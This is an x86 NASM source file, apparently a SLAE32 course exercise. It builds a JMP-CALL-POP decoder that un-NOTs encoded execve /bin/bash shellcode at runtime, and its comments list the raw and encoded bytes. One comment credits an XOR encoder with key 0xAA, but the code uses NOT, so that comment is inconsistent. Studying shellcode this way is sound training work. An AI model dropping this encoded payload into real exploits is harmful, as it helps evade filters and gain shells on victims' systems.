; EXECVE-NOT-decoder.nasm (JMP-CALL-POP)
; SLAE32
; NOT Decoder, no NULL, using shellcode from Module 2-6 as the basis
; Then using the Python3 script "XOR-encoder.py" to encode the shellcode with 0xAA
; Note: No bytes contained in shellcode can match the 0xAA for this lesson
; 
; Before NOT Encoding:                  "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
; After NOT (Complement) Encoding:      "\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f"
; 
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;   - execve does NOT need a return if successful
; EAX = syscall
; EBX = /bin/bash, 0x0
; ECX = Address of /bin/bash,0x00000000
; EDX = 0x00000000
; ESI -> /bin/bash
;

global _start

section .text
_start: 
    jmp short call_shellcode


decoder:
    pop esi
    xor ecx, ecx
    mov cl, 30              ; Length of shellcode is 30 decimal bytes


decode:
    not byte [esi]
    inc esi
    loop decode

    jmp short EncodedShellcode


call_shellcode:
    call decoder
    EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0x9d,0x9e,0x8c,0x97,0x97,0x9d,0x96,0x91,0xd0,0x97,0xd0,0xd0,0xd0,0xd0,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f